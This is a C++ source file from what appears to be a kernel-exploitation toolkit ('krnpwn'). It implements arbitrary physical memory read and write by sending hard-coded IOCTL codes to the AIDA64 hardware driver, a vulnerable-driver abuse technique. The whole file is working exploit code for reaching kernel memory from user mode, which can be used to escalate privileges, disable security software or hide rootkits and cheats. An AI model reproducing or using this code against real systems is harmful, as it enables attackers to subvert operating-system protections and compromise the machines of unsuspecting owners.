#include "krnpwn_aida64.hpp"

#include "../../util/log.hpp"

#pragma pack(push, 1)

struct aida64_mem_t
{
    uint32_t _unused;
    uint32_t buffer;
    uint64_t address;
};
#pragma pack(pop)
// MmMapIoSpace
#define IOCTL_AIDA64_READ_MEM  0x80112074
// MmUnmapIoSpace
#define IOCTL_AIDA64_WRITE_MEM 0x80112078

bool krnpwn::krnpwn_aida64::read_physical_memory( uint64_t address, void* buffer, size_t size )
{
    ULONG rtn = 0;

    if( size % 4 != 0 )
        return false;

    for( uint32_t i = 0; i < size / 4; i++ )
    {
        aida64_mem_t aida_struct;

        aida_struct.address = address + ( 4ull * i );

        if( !DeviceIoControl(
            driver_handle,
            IOCTL_AIDA64_READ_MEM,
            &aida_struct,
            sizeof( aida64_mem_t ),
            &aida_struct,
            sizeof( aida64_mem_t ),
            &rtn,
            nullptr
            ) )
        {
            return false;
        }

        ( ( uint32_t* )buffer )[ i ] = aida_struct.buffer;
    }

    return true;
}

bool krnpwn::krnpwn_aida64::write_physical_memory( uint64_t address, void* buffer, size_t size )
{
    ULONG rtn = 0;

    if( size % 4 != 0 )
        return false;

    for( uint32_t i = 0; i < size / 4; i++ )
    {
        aida64_mem_t aida_struct;

        aida_struct.address = address + ( 4ull * i );
        aida_struct.buffer = ( ( uint32_t* )buffer )[ i ];

        if( !DeviceIoControl(
            driver_handle,
            IOCTL_AIDA64_WRITE_MEM,
            &aida_struct,
            sizeof( aida64_mem_t ),
            &aida_struct,
            sizeof( aida64_mem_t ),
            &rtn,
            nullptr ) )
        {
            log_err( "failed to write physical memory address: ", aida_struct.address );
            return false;
        }
    }

    return true;
}
